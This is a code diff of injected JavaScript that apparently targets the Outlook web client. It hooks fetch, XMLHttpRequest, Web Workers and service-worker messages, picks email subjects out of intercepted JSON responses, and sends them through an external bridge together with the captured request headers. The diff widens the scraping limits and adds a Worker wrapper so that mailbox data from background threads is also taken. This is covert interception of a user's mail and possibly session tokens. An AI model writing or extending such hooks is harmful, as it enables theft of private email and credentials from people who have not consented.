@@ -27,7 +27,7 @@
   function grab(j) {
     var out = [], keys = {}, n = 0;
     (function walk(o, d) {
-      if (!o || typeof o != 'object' || d > 14 || n > 4000) return;
+      if (!o || typeof o != 'object' || d > 30 || n > 400000) return;
       n++;
       if (o.length !== undefined && o.forEach) { for (var i = 0; i < o.length; i++) walk(o[i], d + 1); return; }
       var subj = str(o.ConversationTopic) || str(o.Subject);
@@ -47,10 +47,13 @@
     out.sort(function (a, b) { return b.t - a.t; });
     return out;
   }
+  function diag(s) { try { B.diag(T, s); } catch (e) {} }
   function handle(u, req, text) {
-    if (sent || !text || text.length > 12e6) return;
-    var j; try { j = JSON.parse(text); } catch (e) { return; }
+    if (sent || !text || text.length > 20e6) return;
+    var c0 = text.charAt(0); if (c0 != '{' && c0 != '[') return;
+    var j; try { j = JSON.parse(text); } catch (e) { diag(action(u) + ' ' + Math.round(text.length / 1024) + 'KB not JSON'); return; }
     var it = grab(j);
+    diag(action(u) + ' ' + Math.round(text.length / 1024) + 'KB, ' + it.length + ' emails');
     if (!it.length) return;
     sent = true;
     try { B.items(T, JSON.stringify({ action: action(u), items: it.slice(0, 40), req: req })); } catch (e) {}
@@ -74,13 +77,37 @@
       if (init && init.headers && isReq) { var extra = headersOf(init.headers); for (var k in extra) req.headers[k] = extra[k]; }
       p.then(function (r) {
         try {
-          if (!/json/i.test(r.headers.get('content-type') || '')) return;
           r.clone().text().then(function (t) { handle(u, req, t); }, function () {});
         } catch (e) {}
       }, function () {});
     }
     return p;
   };
+
+  // The new Outlook does a lot of its mailbox calls in a background worker, which the hooks above can't see.
+  // The results come back to the page as messages, so look through those for emails too.
+  function fromWorker(data) {
+    if (sent || !data || typeof data != 'object') return;
+    try {
+      var it = grab(data);
+      if (!it.length) return;
+      diag('worker message, ' + it.length + ' emails');
+      sent = true;
+      B.items(T, JSON.stringify({ action: 'worker', items: it.slice(0, 40), req: null }));
+    } catch (e) {}
+  }
+  var WK = window.Worker;
+  if (WK) {
+    var W2 = function (u, o) {
+      var w = o === undefined ? new WK(u) : new WK(u, o);
+      try { diag('worker started: ' + String(u).split('?')[0].slice(-60)); w.addEventListener('message', function (e) { fromWorker(e.data); }); } catch (e) {}
+      return w;
+    };
+    W2.prototype = WK.prototype;
+    window.Worker = W2;
+  }
+  var SW = navigator.serviceWorker;
+  if (SW && SW.addEventListener) try { SW.addEventListener('message', function (e) { fromWorker(e.data); }); } catch (e) {}
 
   var XP = XMLHttpRequest.prototype, XO = XP.open, XS = XP.send, XH = XP.setRequestHeader;
   XP.open = function (m, u) { this.__ec = { url: abs(u), method: String(m || 'GET').toUpperCase(), headers: {} }; return XO.apply(this, arguments); };
